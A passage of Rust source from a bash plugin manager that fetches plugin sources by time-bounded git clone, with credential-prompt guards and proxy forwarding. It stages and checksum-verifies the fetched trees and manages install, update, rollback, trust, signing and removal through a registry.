    /// exist in the fetched tree before promotion — an honest failure for a
    /// stale recipe, caught at install time. Manager adapters ignore it
    /// (their own layout detect already ran); file sources name it in the
    /// recommended enable verb (`niu plugin enable <id>/<entry>`).
    pub entry: Option<String>,
    /// Hard wall-clock budget for the git transport phase of this install.
    /// The `--bootstrap` startup form sets [`STARTUP_FETCH_BUDGET`]; every
    /// other caller leaves it `None` and gets the verb budget
    /// ([`VERB_FETCH_BUDGET`], niubash#293) — a user-invoked fetch is
    /// bounded too, so a dead origin costs one budget, not a hung verb and
    /// a hand-killed niu leaving orphan git helpers. On expiry the git
    /// process tree is killed and the install fails like any fetch failure
    /// (memoized at startup; the error names the timed-out origin).
    pub fetch_budget: Option<Duration>,
    /// Startup-only credential guards (`GIT_TERMINAL_PROMPT=0`, empty
    /// credential helper): an auth-demanding origin fails the startup fetch
    /// instead of hanging the session behind a hidden prompt. Explicit
    /// verbs keep git's own prompting behavior — a user-invoked add may
    /// legitimately answer a prompt (within the fetch budget).
    pub credential_guard: bool,
}

struct FetchedSource {
    staging: PathBuf,
    adapter: &'static dyn PluginSourceAdapter,
    /// Resolved install id: the manager id for manager-shaped trees, the
    /// derived/explicit id for file-shaped ones.
    id: String,
    version: String,
    checksum_sha256: String,
    commit_sha: Option<String>,
}

/// The full `git` argument list for a shallow clone of `origin` at
/// `ref_name`, including the CRLF guard and the active mirror's insteadOf
/// config (§14.8: the recorded origin stays canonical — GitHub URL in the
/// registry, mirror applied only as a git config key at transport time).
/// Pure, so the insteadOf wiring is testable without spawning git.
/// `credential_guard` (the budgeted startup path only) additionally clears
/// credential helpers so an auth-demanding origin fails the fetch instead
/// of hanging the session; explicit verbs keep git's own prompting
/// behavior (a user-invoked sync may legitimately answer a prompt).
fn clone_arg_list(origin: &str, ref_name: &str, credential_guard: bool) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "-c".into(),
        // OMB has no .gitattributes; CRLF would kill sourcing (§9).
        "core.autocrlf=false".into(),
    ];
    if credential_guard {
        args.extend(["-c".into(), "credential.helper=".into()]);
    }
    args.extend(super::mirrors::git_clone_args(origin));
    args.extend(["clone".into(), "--depth".into(), "1".into()]);
    if ref_name != "HEAD" {
        args.extend(["--branch".into(), ref_name.to_string()]);
    }
    args.push(origin.to_string());
    args
}

/// Per-fetch git transport limits: the wall-clock deadline that bounds the
/// whole phase (computed ONCE per install so multi-command fetches — init +
/// fetch + checkout — share one budget), plus the startup-only credential
/// guards. Decoupled (niubash#293): an explicit verb is budgeted but keeps
/// git's prompting behavior; only the startup form guards credentials.
#[derive(Debug, Clone, Copy, Default)]
struct FetchLimits {
    deadline: Option<Instant>,
    /// The configured budget, for the failure message.
    budget: Option<Duration>,
    credential_guard: bool,
}

impl FetchLimits {
    fn from_request(request: &SourceInstallRequest) -> Self {
        let budget = Some(request.fetch_budget.unwrap_or_else(verb_fetch_budget));
        FetchLimits {
            deadline: budget.map(|budget| Instant::now() + budget),
            budget,
            credential_guard: request.credential_guard,
        }
    }
}

fn git_clone_to(
    staging: &Path,
    origin: &str,
    ref_name: &str,
    limits: FetchLimits,
) -> anyhow::Result<()> {
    let args = clone_arg_list(origin, ref_name, limits.credential_guard);
    let mut command = Command::new("git");
    command.args(&args).arg(staging);
    run_git_bounded(command, limits, "clone", origin)
}

/// Fetch one exact commit without a branch clone: init + shallow
/// `fetch origin <sha>` + checkout FETCH_HEAD. Works on GitHub (allows
/// fetching reachable SHAs) and local repositories. Mirror insteadOf
/// config rides along (§14.8): every subcommand gets the same `-c` keys —
/// insteadOf only affects URL resolution at fetch time, so `remote add`
/// keeps storing the canonical origin.
fn git_fetch_commit_to(
    staging: &Path,
    origin: &str,
    commit: &str,
    limits: FetchLimits,
) -> anyhow::Result<()> {
    let mirror_args = super::mirrors::git_clone_args(origin);
    let guarded = limits.credential_guard;
    let run = |args: &[&str]| -> anyhow::Result<()> {
        let mut command = Command::new("git");
        command
            .arg("-C")
            .arg(staging)
            .arg("-c")
            .arg("core.autocrlf=false")
            .args(&mirror_args);
        if guarded {
            // `-c` keys must precede the subcommand.
            command.arg("-c").arg("credential.helper=");
        }
        command.args(args);
        run_git_bounded(command, limits, args.first().copied().unwrap_or(""), origin)
    };
    fs::create_dir_all(staging)?;
    run(&["init", "-q"])?;
    run(&["remote", "add", "origin", origin])?;
    if run(&["fetch", "--depth", "1", "-q", "origin", commit]).is_err() {
        // Some servers refuse fetch-by-sha; fall back to a plain shallow
        // clone of the default branch and check the commit out from it.
        fs::remove_dir_all(staging)?;
        git_clone_to(staging, origin, "HEAD", limits)?;
        run(&["checkout", "-q", commit])?;
        return Ok(());
    }
    run(&["checkout", "-q", "FETCH_HEAD"])?;
    Ok(())
}

/// Credential-prompt guards for the budgeted (startup) git runs: `git`
/// never asks — neither on the terminal (`GIT_TERMINAL_PROMPT`) nor through
/// an askpass program (`GIT_ASKPASS`); the `-c credential.helper=` arg
/// (which must precede the subcommand) comes from the arg-list builders.
/// An auth-demanding origin fails the fetch instead of hanging the
/// session behind a hidden prompt.
fn apply_credential_guards(command: &mut Command) {
    command
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_ASKPASS", "echo");
}

/// The proxy environment a spawned `git` must carry (niubash#294): every
/// known proxy variable that is set in this process, forwarded explicitly,
/// plus the case-variant mirror — a `HTTP_PROXY`-only environment gains
/// `http_proxy` (and vice versa) so curl inside git finds a spelling it
/// honors regardless of how the parent's block was normalized. Pure enough
/// to assert on the Command (`get_envs`) without spawning.
fn proxy_env_forwarding() -> Vec<(String, std::ffi::OsString)> {
    let mut out: Vec<(String, std::ffi::OsString)> = Vec::new();
    for name in PROXY_ENV_VARS {
        if let Some(value) = std::env::var_os(name) {
            out.push((name.to_string(), value));
        }
    }
    for (upper, lower) in [
        ("HTTP_PROXY", "http_proxy"),
        ("HTTPS_PROXY", "https_proxy"),
        ("ALL_PROXY", "all_proxy"),
        ("NO_PROXY", "no_proxy"),
    ] {
        let upper_value = std::env::var_os(upper);
        let lower_value = std::env::var_os(lower);
        match (upper_value, lower_value) {
            (Some(value), None) => out.push((lower.to_string(), value)),
            (None, Some(value)) => out.push((upper.to_string(), value)),
            _ => {}
        }
    }
    out
}

fn apply_proxy_passthrough(command: &mut Command) {
    for (name, value) in proxy_env_forwarding() {
        command.env(name, value);
    }
}

/// One bounded, proxy-forwarding, tree-killing `git clone` for the plugin
/// verbs that fetch a tree outside the source-install pipeline (`distro
/// import`, niubash#293/#294): the verb budget bounds it, the process tree
/// dies at the deadline, and the clone honors the user's proxy environment
/// exactly like a manual `git clone`.
pub(crate) fn git_clone_bounded(origin: &str, dest: &Path) -> anyhow::Result<()> {
    let args = clone_arg_list(origin, "HEAD", false);
    let mut command = Command::new("git");
    command.args(&args).arg(dest);
    let budget = verb_fetch_budget();
    run_git_bounded(
        command,
        FetchLimits {
            deadline: Some(Instant::now() + budget),
            budget: Some(budget),
            credential_guard: false,
        },
        "clone",
        origin,
    )
}

/// Run one git command to completion under the fetch limits (every verb's
/// transport is bounded now — niubash#293; only the startup form adds the
/// credential guards). The deadline closes the slowsource P0's two failure
/// modes — a TLS reset that costs git's whole handshake and a dropped SYN
/// that hangs it for minutes — and the verb-level twin: a bad origin used
/// to hang an explicit `niu plugin add`/`sync` for minutes until the user
/// killed niu, leaving orphan `git.exe` helpers behind. `status()` has no
/// timeout; this polls instead. On expiry the whole process tree is killed
/// (see `kill_on_close_job`) and the error NAMES the origin and budget, so
/// the report says which source hung.
fn run_git_bounded(
    mut command: Command,
    limits: FetchLimits,
    subcommand: &str,
    origin: &str,
) -> anyhow::Result<()> {
    if limits.credential_guard {
        apply_credential_guards(&mut command);
    }
    // niubash#294: the proxy environment rides along explicitly — the
    // child's clone must behave like the user's manual `git clone`.
    apply_proxy_passthrough(&mut command);
    // A kill-on-close job binds the whole git process tree: killing
    // `git.exe` alone orphans `git-remote-https`, which keeps writing the
    // staging clone and holds the files a synchronous cleanup then blocks
    // on (measured: a 300ms budget turned into a 5.2s wall purely on the
    // orphan's own TLS-failure schedule). Closing the job handle at scope
    // end terminates everything still running under it.
    crate::console_guard::suppress_orphan_console(&mut command);
    let job = kill_on_close_job();
    let mut child = command
        .spawn()
        .with_context(|| "failed to run git; is git.exe on PATH?")?;
    crate::console_guard::adopt_orphan_console(child.id());
    job.assign(&child);
    // Poll instead of `status()`: std has no wait-with-timeout, and 20ms
    // granularity is far below any real clone's duration.
    const POLL: Duration = Duration::from_millis(20);
    loop {
        match child.try_wait()? {
            Some(status) => {
                if !status.success() {
                    anyhow::bail!(
                        "git {subcommand} of '{origin}' exited with status {}",
                        status.code().unwrap_or(1)
                    );
                }
                return Ok(());
            }
            None => {
                if limits
                    .deadline
                    .is_some_and(|deadline| Instant::now() >= deadline)
                {
                    let _ = child.kill();
                    let _ = child.wait();
                    anyhow::bail!(
                        "git {subcommand} of '{origin}' timed out after {}s (fetch \
                         budget; `--timeout <seconds>` raises it) — nothing was \
                         installed",
                        limits.budget.map(|budget| budget.as_secs()).unwrap_or(0)
                    );
                }
                std::thread::sleep(POLL);
            }
        }
    }
}

/// A kill-on-close job object (Windows): dropping the handle terminates
/// every process still assigned to it, so a timed-out git fetch cannot
/// leave a download tree behind. A construction failure yields a null
/// handle and only loses the tree-kill, never the run.
#[cfg(windows)]
pub struct JobGuard(HANDLE);

#[cfg(windows)]
impl JobGuard {
    /// Bind a spawned child into the job (best effort: an assignment
    /// failure only loses the tree-kill, never the run).
    pub fn assign<T: std::os::windows::io::AsRawHandle>(&self, child: &T) {
        use windows_sys::Win32::System::JobObjects::AssignProcessToJobObject;
        unsafe {
            AssignProcessToJobObject(self.0, child.as_raw_handle());
        }
    }
}

#[cfg(windows)]
impl Drop for JobGuard {
    fn drop(&mut self) {
        if !self.0.is_null() {
            // KILL_ON_JOB_CLOSE: this closes every surviving process in the
            // tree (the timed-out git's remote helper included).
            unsafe { CloseHandle(self.0) };
        }
    }
}

#[cfg(windows)]
fn kill_on_close_job() -> JobGuard {
    use windows_sys::Win32::System::JobObjects::{
        CreateJobObjectW, JobObjectExtendedLimitInformation, SetInformationJobObject,
        JOBOBJECT_EXTENDED_LIMIT_INFORMATION, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE,
    };

    unsafe {
        let job = CreateJobObjectW(std::ptr::null(), std::ptr::null());
        if job.is_null() {
            return JobGuard(std::ptr::null_mut());
        }
        let mut limits: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        limits.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        if SetInformationJobObject(
            job,
            JobObjectExtendedLimitInformation,
            &limits as *const _ as *const _,
            std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
        ) == 0
        {
            CloseHandle(job);
            return JobGuard(std::ptr::null_mut());
        }
        JobGuard(job)
    }
}

#[cfg(not(windows))]
fn kill_on_close_job() -> UnixJobGuard {
    UnixJobGuard
}

/// Non-Windows stand-in: the child kill already takes git down; POSIX
/// children of a killed git lose their transport when the pipe breaks.
#[cfg(not(windows))]
pub struct UnixJobGuard;

#[cfg(not(windows))]
impl UnixJobGuard {
    pub fn assign<T>(&self, _child: &T) {}
}

/// Shared fetch pipeline (§12.2): fetch to staging, detect adapter, compute
/// the tree checksum, and verify the expected checksum when provided.
/// Staging is always removed on failure.
fn fetch_source_to_staging(request: &SourceInstallRequest) -> anyhow::Result<FetchedSource> {
    let origin = request.origin.trim();
    if origin.is_empty() {
        anyhow::bail!("source origin is empty");
    }
    let staging = unique_staging_path();
    if let Some(parent) = staging.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::create_dir_all(&staging)?;
    let staging_for_cleanup = staging.clone();
    // Every git transport phase is bounded (niubash#293): the startup form
    // carries its tight `STARTUP_FETCH_BUDGET`, every other caller gets the
    // verb budget (`VERB_FETCH_BUDGET`, `--timeout`-overridable). The
    // deadline is computed once here, so a multi-command fetch (init +
    // fetch + checkout) shares one budget. The local-snapshot path is plain
    // file IO (no network child) and stays unbudgeted.
    let limits = FetchLimits::from_request(request);
    let origin_path = Path::new(origin);
    let result = (|| -> anyhow::Result<FetchedSource> {
        // Origin semantics: an explicit ref or commit forces git semantics
        // (a local git repository path is also a directory and must clone,
        // not snapshot — the working tree may be ahead of the requested
        // ref). Without either, directories and plain files snapshot and
        // everything else clones (niubash#300: a bare file path is a valid
        // wild source — snapshot-copied like a directory).
        let commit = request
            .commit
            .clone()
            .filter(|value| !value.trim().is_empty());
        let explicit_ref = request
            .ref_name
            .clone()
            .filter(|value| value != LOCAL_ORIGIN_REF);
        let local_tree = origin_path.is_dir() || origin_path.is_file();
        let ref_name = match &explicit_ref {
            Some(value) => value.clone(),
            None if commit.is_some() || !local_tree => "HEAD".to_string(),
            None => LOCAL_ORIGIN_REF.to_string(),
        };
        if commit.is_some() {
            git_fetch_commit_to(&staging, origin, commit.as_deref().unwrap(), limits)?;
        } else if ref_name == LOCAL_ORIGIN_REF && origin_path.is_file() {
            // Single-file wild source (niubash#300): snapshot the file into
            // its own tree, byte-faithful.
            let name = origin_path.file_name().ok_or_else(|| {
                anyhow!("cannot determine a file name for the local origin '{origin}'")
            })?;
            fs::copy(origin_path, staging.join(name)).with_context(|| {
                format!(
                    "failed to snapshot {} into the source tree",
                    origin_path.display()
                )
            })?;
        } else if ref_name == LOCAL_ORIGIN_REF {
            copy_tree(origin_path, &staging)?;
        } else {
            git_clone_to(&staging, origin, &ref_name, limits)?;
        }

        let adapter = match &request.adapter {
            Some(kind) => {
                let adapter =
                    adapter_for(kind).ok_or_else(|| anyhow!("unknown source kind '{kind}'"))?;
                if !adapter.detect(&staging) {
                    anyhow::bail!(
                        "fetched tree at '{}' does not look like '{}'",
                        origin,
                        adapter.id()
                    );
                }
                adapter
            }
            // §14.6.1 base layer: any known manager first, then the open
            // file-source fallback (a tree with at least one sourceable
            // *.sh/*.bash — candidates are enumerated honestly at enable
            // time, never guessed here).
            None => detect_for_install(&staging).ok_or_else(|| {
                anyhow!(
                    "no supported plugin manager detected in '{}' and no sourceable \
                     *.sh/*.bash files either; {}",
                    origin,
                    supported_adapters_hint()
                )
            })?,
        };
        let id = derive_install_id(adapter, origin, request.id.as_deref())?;
        let version = adapter.installed_version(&staging);
        // Recipe-named entry: the recipe declared which file this source is
        // about — verify it exists before promoting (honest failure for a
        // stale recipe; wt47's detect_entry contract, expressed once here
        // instead of per-adapter).
        if let Some(entry) = request
            .entry
            .as_deref()
            .map(str::trim)
            .filter(|entry| !entry.is_empty())
        {
            if !staging.join(entry).is_file() {
                anyhow::bail!("entry file '{entry}' not found in the fetched tree of '{origin}'");
            }
        }
        let checksum_sha256 = tree_sha256(&staging)?;
        if let Some(expected) = request.expected_checksum.as_deref() {
            if !checksum_sha256.eq_ignore_ascii_case(expected.trim()) {
                anyhow::bail!(
                    "checksum mismatch for source '{}': expected {}, got {}",
                    id,
                    expected,
                    checksum_sha256
                );
            }
        }
        let commit_sha = git_head_full_sha(&staging);
        Ok(FetchedSource {
            staging,
            adapter,
            id,
            version,
            checksum_sha256,
            commit_sha,
        })
    })();
    if result.is_err() {
        let _ = fs::remove_dir_all(&staging_for_cleanup);
    }
    result
}

fn unique_staging_path() -> PathBuf {
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or(0);
    sources_root().join(format!(".staging-{}-{stamp}", std::process::id()))
}

/// Remove an installed tree, tolerating an already-missing directory
/// (degraded sources restore/rollback onto a fresh fetch).
fn remove_tree_if_present(path: &Path) -> anyhow::Result<()> {
    match fs::remove_dir_all(path) {
        Ok(()) => Ok(()),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(err) => Err(err.into()),
    }
}

fn promote_staging(staging: &Path, dest: &Path) -> anyhow::Result<()> {
    if fs::rename(staging, dest).is_err() {
        copy_tree(staging, dest)?;
        let _ = fs::remove_dir_all(staging);
    }
    Ok(())
}

/// Install an external plugin-manager source. The fetched tree is verified,
/// promoted to `sources/<adapter-id>/`, and registered **untrusted** — none
/// of its assets activate until `trust_source` (§12.2 execution gate).
/// A source whose install identity is already registered is refused: this
/// is the imperative verb (`niu plugin source add`); the declarative path
/// ([`install_or_adopt`]) adopts the existing install instead.
pub fn add_source(request: SourceInstallRequest) -> anyhow::Result<SourceRecord> {
    let (record, adopted) = install_or_adopt(request)?;
    if adopted {
        anyhow::bail!(
            "source '{id}' is already registered; remove it first with niu plugin source remove {id}",
            id = record.id
        );
    }
    Ok(record)
}

/// A pinned checksum must never be silently ignored (wt83 #173): when the
/// request pins one and the install identity is already registered, verify
/// the pin against the recorded tree checksum — no fetch needed. The fetch
/// path enforces the same rule in `fetch_source_to_staging`.
fn verify_pin_on_adopt(
    record: &SourceRecord,
    request: &SourceInstallRequest,
) -> anyhow::Result<()> {
    if let Some(expected) = request
        .expected_checksum
        .as_deref()
        .map(str::trim)
        .filter(|expected| !expected.is_empty())
    {
        if !record.checksum_sha256.eq_ignore_ascii_case(expected) {
            anyhow::bail!(
                "checksum mismatch for source '{}': expected {}, got {}",
                record.id,
                expected,
                record.checksum_sha256
            );
        }
    }
    Ok(())
}

/// Install a source, or **adopt** the existing install when its identity is
/// already registered — the declarative path's answer to "already
/// registered" (§14.6.3): `niu plugin add <target>` on an installed source
/// must declare it in the spec, never dead-end on the imperative refusal
/// above. Identity is, in order: the install id derivable without fetching
/// (explicit id, manager id, or the origin tail for a kind-pinned entry),
/// the recorded origin, and finally the id the fetched tree derives — a
/// duplicate detected only after fetch adopts without a second fetch ever
/// promoting. Returns the record plus `true` when an existing install was
/// adopted (nothing fetched into place, nothing written).
pub fn install_or_adopt(request: SourceInstallRequest) -> anyhow::Result<(SourceRecord, bool)> {
    // niubash#178: refuse BEFORE any fetch/promotion — an install whose
    // registry write would be refused must not leave a half-installed tree
    // (or a misleading "directory already exists" on the later retry).
    if let Some(corruption) = registry_corruption() {
        preserve_and_warn_corrupt_registry(&corruption);
        anyhow::bail!(
            "cannot install: plugin source registry {} fails to parse ({}) and the \
             install would not be registrable; fix or remove the file (original \
             preserved at {}) and retry",
            registry_path().display(),
            corruption.error,
            corrupt_registry_backup_path().display()
        );
    }
    // Cheap pre-checks (no fetch): derived id, then recorded origin.
    if let Some(kind) = request.adapter.as_deref() {
        if let Some(adapter) = super::descriptors::adapter_for(kind) {
            if let Ok(id) = super::descriptors::derive_install_id(
                adapter,
                &request.origin,
                request.id.as_deref(),
            ) {
                if let Some(record) = registered_by_id(&id) {
                    verify_pin_on_adopt(&record, &request)?;
                    return Ok((record, true));
                }
            }
        }
    }
    if let Some(record) = read_source_registry()
        .into_iter()
        .find(|record| record.url.trim() == request.origin.trim())
    {
        verify_pin_on_adopt(&record, &request)?;
        return Ok((record, true));
    }

    let fetched = fetch_source_to_staging(&request)?;
    let id = fetched.id.clone();
    // The fetch detected/derived an identity that is already registered:
    // drop the staging tree and adopt the existing install. The fetched
    // tree passed the pin; the registered tree did not come from this
    // fetch, so the pin is checked against its recorded checksum too —
    // adopting a different tree under a matching pin would be the same
    // silent-ignore lie.
    if let Some(record) = registered_by_id(&id) {
        verify_pin_on_adopt(&record, &request)?;
        let _ = remove_tree_if_present(&fetched.staging);
        return Ok((record, true));
    }
    let dest = sources_root().join(&id);
    if dest.exists() {
        anyhow::bail!("directory {} already exists", dest.display());
    }
    promote_staging(&fetched.staging, &dest)?;

    let record = SourceRecord {
        id: id.clone(),
        adapter: fetched.adapter.id().to_string(),
        url: request.origin.trim().to_string(),
        ref_name: request
            .ref_name
            .clone()
            .unwrap_or_else(|| LOCAL_ORIGIN_REF.to_string()),
        version: fetched.version,
        path: dest,
        trusted: false,
        license: fetched.adapter.license().to_string(),
        checksum_sha256: fetched.checksum_sha256,
        installed_at: now_timestamp(),
        commit_sha: fetched.commit_sha,
        trust_policy: TrustPolicy::default(),
        signature: None,
        previous: None,
        spec_enabled: None,
        spec_theme: None,
        // niubash#298: an explicit pin or a curated catalog origin gives the
        // first fetch an integrity reference; anything else lands
        // unverified and stays marked that way.
        first_fetch_verified: request
            .expected_checksum
            .as_deref()
            .is_some_and(|pin| !pin.trim().is_empty())
            || super::catalog::is_catalog_origin(request.origin.trim()),
    };
    let mut registry = read_source_registry();
    registry.push(record.clone());
    write_source_registry(&registry)?;
    Ok((record, false))
}

/// The registered record for an install id, when present.
fn registered_by_id(id: &str) -> Option<SourceRecord> {
    read_source_registry()
        .into_iter()
        .find(|record| record.id == id)
}

/// Update a registered source to a new ref/tree. The previous state is
/// recorded for `rollback_source` (§12.4). Trust persists only when the
/// origin URL is unchanged; a changed origin resets trust (re-pass the
/// execution gate).
pub fn update_source(
    id: &str,
    request: SourceInstallRequest,
) -> anyhow::Result<SourceUpdateSummary> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry[index].clone();
    // An update without an explicit origin re-fetches the registered origin.
    let mut request = request;
    if request.origin.trim().is_empty() {
        request.origin = record.url.clone();
    }
    let fetched = fetch_source_to_staging(&request)?;

    let origin_changed = request.origin.trim() != record.url;
    let previous = SourcePreviousState {
        ref_name: record.ref_name.clone(),
        version: record.version.clone(),
        checksum_sha256: record.checksum_sha256.clone(),
        commit_sha: record.commit_sha.clone(),
    };
    remove_tree_if_present(&record.path)
        .with_context(|| format!("failed to remove old tree {}", record.path.display()))?;
    promote_staging(&fetched.staging, &record.path)?;

    // Trust semantics (§12.4 + the signature tier): same-origin updates
    // keep trust under the checksum policy; under the local-signature
    // policy only the exact signed tree stays trusted, so any changed tree
    // (new upstream fetch) re-enters the execution gate until re-signed.
    let tree_unchanged = fetched.checksum_sha256 == record.checksum_sha256;
    let keep_trust =
        !origin_changed && (record.trust_policy == TrustPolicy::Checksum || tree_unchanged);
    let updated = SourceRecord {
        id: record.id.clone(),
        adapter: record.adapter.clone(),
        url: request.origin.trim().to_string(),
        ref_name: request.ref_name.clone().unwrap_or(record.ref_name.clone()),
        version: fetched.version,
        path: record.path.clone(),
        trusted: record.trusted && keep_trust,
        license: fetched.adapter.license().to_string(),
        checksum_sha256: fetched.checksum_sha256,
        installed_at: now_timestamp(),
        commit_sha: fetched.commit_sha,
        trust_policy: record.trust_policy,
        signature: record.signature,
        previous: Some(previous),
        spec_enabled: record.spec_enabled,
        spec_theme: record.spec_theme,
        // The flag is about the FIRST fetch's integrity reference (niubash#298);
        // an update keeps what the install recorded.
        first_fetch_verified: record.first_fetch_verified,
    };
    let summary = SourceUpdateSummary {
        id: updated.id.clone(),
        version: updated.version.clone(),
        checksum_sha256: updated.checksum_sha256.clone(),
        previous: updated.previous.clone(),
    };
    registry[index] = updated;
    write_source_registry(&registry)?;
    // The tree was just refetched and its pin rewritten: any stale drift
    // entry is obsolete (niubash#297).
    clear_drifted_source(id)?;
    Ok(summary)
}

/// Roll back to the recorded previous state (§12.4): re-fetch the previous
/// ref, verify it against the previous checksum, restore the record. Local
/// origins whose tree drifted fail the checksum and roll back is refused
/// (reinstall from the old tree instead).
pub fn rollback_source(id: &str) -> anyhow::Result<SourceUpdateSummary> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry[index].clone();
    let previous = record
        .previous
        .clone()
        .ok_or_else(|| anyhow!("no previous state recorded for '{id}'"))?;

    // Prefer the exact commit pin; fall back to the recorded ref (and to a
    // plain snapshot for local origins, which rollback then rejects via the
    // checksum when the origin drifted).
    let ref_fallback = if previous.commit_sha.is_some() || previous.ref_name == LOCAL_ORIGIN_REF {
        None
    } else {
        Some(previous.ref_name.clone())
    };
    let fetched = fetch_source_to_staging(&SourceInstallRequest {
        adapter: Some(record.adapter.clone()),
        origin: record.url.clone(),
        commit: previous.commit_sha.clone(),
        ref_name: ref_fallback,
        expected_checksum: Some(previous.checksum_sha256.clone()),
        id: None,
        entry: None,
        fetch_budget: None,
        credential_guard: false,
    })?;

    remove_tree_if_present(&record.path)
        .with_context(|| format!("failed to remove tree {}", record.path.display()))?;
    promote_staging(&fetched.staging, &record.path)?;

    let restored = SourceRecord {
        trusted: record.trusted,
        ref_name: previous.ref_name.clone(),
        version: previous.version.clone(),
        checksum_sha256: previous.checksum_sha256.clone(),
        commit_sha: previous.commit_sha.clone().or(fetched.commit_sha.clone()),
        previous: None,
        installed_at: now_timestamp(),
        ..record
    };
    let summary = SourceUpdateSummary {
        id: restored.id.clone(),
        version: restored.version.clone(),
        checksum_sha256: restored.checksum_sha256.clone(),
        previous: Some(previous),
    };
    registry[index] = restored;
    write_source_registry(&registry)?;
    // The restored tree matches the previous pin again (niubash#297).
    clear_drifted_source(id)?;
    Ok(summary)
}

/// Priority tier of a theme source for same-name theme resolution (lower
/// wins): 0 = oh-my-bash — niu's primary external framework (the base of
/// every built-in collection, the rc template's default theme channel) —
/// 1 = everything else. The single authority for the ranking: the setup
/// wizard's gallery dedupe (the wt61 G2 fix) and the spec-layer theme-claim
/// reconciliation (niubash#168) must never disagree about who owns a shared
/// theme name.
pub fn primary_theme_source_rank(source_id: &str) -> u8 {
    if source_id == "oh-my-bash" {
        0
    } else {
        1
    }
}

/// Flip the execution gate for a source: its assets start contributing to
/// the catalog/loader (§12.2). The gate is only flipped on a healthy tree —
/// a missing directory (degraded) or a checksum mismatch refuses trust
/// until the tree is restored (`niu plugin restore <id>`).
pub fn trust_source(id: &str) -> anyhow::Result<SourceRecord> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry[index].clone();
    if !record.path.is_dir() {
        anyhow::bail!(
            "cannot trust '{}': the installed tree is missing (degraded); \
             restore it with `niu plugin restore {id}`",
            record.id
        );
    }
    // The same pin check the runtime gate runs (niubash#297) — one
    // authority, no weaker duplicate. Signature state is not consulted:
    // trust is about the tree matching its pin.
    let (actual, checksum_ok) = tree_pin_check(&record)?;
    if !checksum_ok {
        anyhow::bail!(
            "cannot trust '{}': tree checksum mismatch (recorded {}, actual {}); \
             restore the pristine tree with `niu plugin restore {id}`",
            record.id,
            record.checksum_sha256,
            actual
        );
    }
    registry[index].trusted = true;
    let trusted = registry[index].clone();
    write_source_registry(&registry)?;
    // Trust re-passed the checksum gate: the tree matches the pin again
    // (niubash#297).
    clear_drifted_source(id)?;
    Ok(trusted)
}

/// Promote a source to the local-signature trust tier (`niu plugin source
/// sign <id>`): verify the tree matches the recorded checksum, then sign
/// that digest with the machine-local ed25519 key. Signing implies trust —
/// you cannot meaningfully sign a tree and leave it untrusted — so the
/// execution gate flips too, exactly like `trust` (which still applies the
/// same health checks).
pub fn sign_source(id: &str) -> anyhow::Result<SourceRecord> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry[index].clone();
    if !record.path.is_dir() {
        anyhow::bail!(
            "cannot sign '{}': the installed tree is missing (degraded); \
             restore it with `niu plugin restore {id}` first",
            record.id
        );
    }
    // The same pin check the runtime gate runs (niubash#297). Only the
    // tree-vs-pin half: a stale signature is what signing repairs.
    let (actual, checksum_ok) = tree_pin_check(&record)?;
    if !checksum_ok {
        anyhow::bail!(
            "cannot sign '{}': tree checksum mismatch (recorded {}, actual {}); \
             restore the pristine tree first (`niu plugin restore {id}`)",
            record.id,
            record.checksum_sha256,
            actual
        );
    }
    let signature = super::trust::sign_digest(&actual)?;
    registry[index].trusted = true;
    registry[index].trust_policy = TrustPolicy::LocalSign;
    registry[index].signature = Some(signature);
    let signed = registry[index].clone();
    write_source_registry(&registry)?;
    // Signing verified the tree against its pin first (niubash#297).
    clear_drifted_source(id)?;
    Ok(signed)
}

/// Uninstall: delete the tree (only directories we placed under the sources
/// root) and the registry entry, plus the spec declaration naming it — the
/// spec is the truth, so an uninstall that left the entry would have the
/// next sync resurrect the source (the wizard's undo receipts name this
/// verb). Trust state is irrelevant for removal.
pub fn remove_source(id: &str) -> anyhow::Result<PathBuf> {
    let mut registry = read_source_registry();
    let index = registry
        .iter()
        .position(|record| record.id == id)
        .ok_or_else(|| anyhow!("unknown source '{id}'"))?;
    let record = registry.remove(index);
    write_source_registry(&registry)?;
    if let Some(mut spec) = super::spec::load_spec()? {
        let before = spec.sources.len();
        spec.sources.retain(|entry| {
            super::spec::resolve_entry_id(entry).as_deref() != Some(id)
                && entry.id.as_deref() != Some(id)
                && entry.target.trim() != record.url.trim()
        });
        if spec.sources.len() != before {
            super::spec::save_spec(&spec)?;
        }
    }

    let root = sources_root();
    if record.path.starts_with(&root)
        && record.path != root
        && record.path.is_dir()
        // Only remove directories that still match the registered layout.
        && adapter_for(&record.adapter).is_some_and(|a| a.detect(&record.path))
    {
        fs::remove_dir_all(&record.path)
            .with_context(|| format!("failed to remove {}", record.path.display()))?;
    }
    // The source is gone: a stale drift entry would warn forever (niubash#297).
    clear_drifted_source(id)?;
    Ok(record.path)
}

/// `niu plugin source list` rows (§11.4 state machine). Trusted sources get
/// the runtime tamper gate (niubash#297): a tree that no longer matches its
/// lockfile pin is degraded — assets must not load off a modified tree.
pub fn list_sources() -> Vec<SourceStatus> {
    let mut out = Vec::new();
    for record in read_source_registry() {
        let adapter = adapter_for(&record.adapter);
        let missing = !record.path.is_dir();
        // niubash#297: drift only matters for trusted trees — an untrusted
        // source contributes nothing and re-passes the checksum gate at
        // `trust` time anyway.
        let drifted = !missing
            && record.trusted
            && match verify_record(&record) {
                Ok(report) => !report.verified,
                Err(_) => true, // an unreadable tree is a broken tree
